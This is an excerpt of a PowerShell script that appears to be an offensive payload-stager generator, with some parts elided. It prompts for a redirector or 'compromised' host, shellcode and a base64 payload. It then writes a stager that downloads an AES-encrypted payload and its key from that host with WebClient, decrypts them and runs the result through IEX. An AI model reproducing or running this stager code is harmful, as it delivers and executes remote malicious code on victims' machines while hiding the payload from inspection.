...
$script:ADProperty = $false
$script:custom = $false
$script:customkey = $false
$script:shellcode = $false
$script:key = $false
$script:fullpayload = $false
$script:EncryptedString = $false
$script:EncryptedB64 = $false
$script:base64IV = $false
$script:WriteScript = $false
$script:quesWriteScript = $false
$script:targetDomain = $false
$script:username = $false
$script:compromised = $false

function Get-Answers {
	
	while (!$script:compromised){
		$script:compromised = Read-Host "What host will be used as a redirector (If none, just provide the host of the webserver)?"
	}
	...
	while (!$script:custom -or $script:custom -eq "Invalid"){
		...
		if ($script:custom -eq "True"){
			$file = Read-Host "Please enter the location where your base64 encoded payload is stored"
			if($file.StartsWith("http")){
				Write-Host "Downloading file content..."
				$script:fullpayload = (New-object System.Net.WebClient).DownloadString("$file")
			}
			else{
...
function Invoke-GenerateStager {
	...
	$Stager = ""
	$Stager += "`$$varEncryptedB64 = (new-object System.Net.WebClient).DownloadString(`"http://$script:compromised/enc.txt`")`n"
	...
	$Stager += "`$$varKey = (new-object System.Net.WebClient).DownloadString(`"http://$script:compromised/key.txt`")`n"
	$Stager += "`$$varKey = `$$varKey.replace(`"``r`",`"`").replace(`"``n`",`"`");`n"
	...
	$Stager += "IEX `$$varunencryptedData`n"
	$Stager += "`$$varAESManaged.Clear()`n"
	$Stager | Out-File Stager.txt
	$script:encryptedb64 | Out-File encrypted.txt
